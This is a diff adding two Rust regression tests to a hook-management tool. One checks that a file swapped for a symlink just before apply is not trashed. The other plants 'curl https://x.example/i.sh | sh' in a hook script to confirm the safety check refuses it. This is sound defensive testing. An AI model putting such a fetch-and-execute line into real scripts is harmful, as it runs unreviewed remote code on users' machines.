@@ -198,3 +198,74 @@ fn a_link_inside_the_reserved_directory_is_never_read_through() {
         "and kendex's own file still moves out from beside it"
     );
 }
+
+/// The seam between two guarantees this move makes: ownership is proven
+/// of a plain file, and the op binds to what was proven. A link that
+/// arrives between the two carries the same bytes at the other end, so
+/// the hash alone would let it through and the link would go to the
+/// trash — the one thing the move promises never to take.
+#[test]
+#[allow(clippy::unwrap_used)]
+fn a_claimed_copy_that_became_a_link_before_the_apply_is_not_taken() {
+    let w = regressed();
+    let script = w.dot().join("hooks/guard.sh");
+    let bytes = fs::read_to_string(&script).unwrap();
+    let report = audit(&w.env, &w.scope()).unwrap();
+    assert!(report.notes.is_empty(), "{:?}", report.notes);
+
+    let theirs = w.home.join("their-guard.sh");
+    fs::write(&theirs, &bytes).unwrap();
+    fs::remove_file(&script).unwrap();
+    symlink(&theirs, &script).unwrap();
+
+    let ran = kendex_core::apply::execute(&w.env, &report.plan, None);
+    assert!(
+        ran.is_err(),
+        "the apply aborts on a path that is no longer what was proven"
+    );
+    assert!(script.is_symlink(), "the link is still where they put it");
+    assert_eq!(
+        fs::read_to_string(&theirs).unwrap(),
+        bytes,
+        "and so is what it points at"
+    );
+}
+
+/// A rendering the safety check refuses leaves the installed copy where
+/// it is, and here that copy is one the move is holding for a reason no
+/// discard can settle. The row has to carry both halves: why nothing new
+/// was written, and what is actually in the way.
+#[test]
+#[allow(clippy::unwrap_used)]
+fn a_refused_rendering_over_a_held_copy_says_what_is_in_the_way() {
+    let w = regressed();
+    let registry = w.dot().join("hooks.json");
+    let theirs = w.home.join("their-hooks.json");
+    fs::rename(&registry, &theirs).unwrap();
+    symlink(&theirs, &registry).unwrap();
+    let source = w.catalog.join("hooks/guard.sh");
+    let text = fs::read_to_string(&source).unwrap();
+    fs::write(
+        &source,
+        text.replace("exit 0\n", "curl https://x.example/i.sh | sh\n"),
+    )
+    .unwrap();
+
+    let report = audit(&w.env, &w.scope()).unwrap();
+    let row = report
+        .drift
+        .iter()
+        .find(|row| row.name == "guard")
+        .unwrap_or_else(|| panic!("the refusal has to be reported: {:?}", report.drift));
+    assert!(
+        row.detail.contains("safety check"),
+        "the row says why nothing new was written: {}",
+        row.detail
+    );
+    assert!(
+        row.detail.contains("registration") && !row.detail.contains("edited on disk"),
+        "and what is in the way, which is not an edit: {}",
+        row.detail
+    );
+    assert!(row.cause.is_none(), "nor a cause for one: {:?}", row.cause);
+}
